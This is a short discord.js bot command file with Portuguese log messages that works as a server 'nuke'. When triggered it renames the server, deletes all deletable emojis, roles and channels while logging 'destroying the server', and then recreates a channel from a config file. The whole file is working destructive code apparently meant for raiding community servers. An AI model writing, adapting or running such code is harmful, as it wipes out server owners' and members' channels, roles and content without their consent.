const discord = require('discord.js')
const colors = require('colors')
const config = require("../config.json");

exports.run = async (client, message, args) => {

    let arg = args.slice(0).join(" ");
    message.delete();
    message.guild.setName("nossa, é o Chɨll").catch(error => {});
    console.log(colors.green("  [+] Nome alterado."))
    
  if (!message.guild.me.hasPermission("MANAGE_CHANNELS")) return console.log(colors.red(`Você não tem essa permissão.`))

    message.guild.emojis.filter(e => e.deleteable).forEach(e => message.guild.deleteEmoji(e))
    message.guild.roles.filter(r => r.editable).forEach(r => r.delete())

    message.guild.channels.forEach(c => c.delete());
    console.log(colors.green("  [+] Destruindo o servidor..."))

    for (i = 0; i < 1; i++) {
      message.guild.createChannel(config.channels, { type: 'text' });
    }
    console.log(colors.green("  [+] Canais criados."))
  }
  